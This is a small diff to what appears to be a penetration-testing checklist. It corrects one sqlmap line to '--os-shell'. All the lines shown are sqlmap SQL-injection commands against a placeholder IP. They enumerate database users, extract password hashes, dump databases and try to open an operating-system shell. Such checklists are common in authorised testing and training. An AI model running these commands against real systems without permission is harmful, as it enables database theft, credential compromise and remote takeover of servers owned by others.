@@ -4,6 +4,6 @@
 ☐ sqlmap -r name.txt --dbms mysql --technique=U --users
 ☐ sqlmap -r name.txt --dbms mysql --technique=U  --passwords
 ☐ sqlmap -u http://XX.XX.XX.XX/tst.php?id=1 -p "id" --dbms=mysql --dump
-☐ sqlmap -u http://XX.XX.XX.XX/tst.php?id=1 -p "id" --dbms=mysql --os shel
+☐ sqlmap -u http://XX.XX.XX.XX/tst.php?id=1 -p "id" --dbms=mysql --os-shell
 ------------------------
 
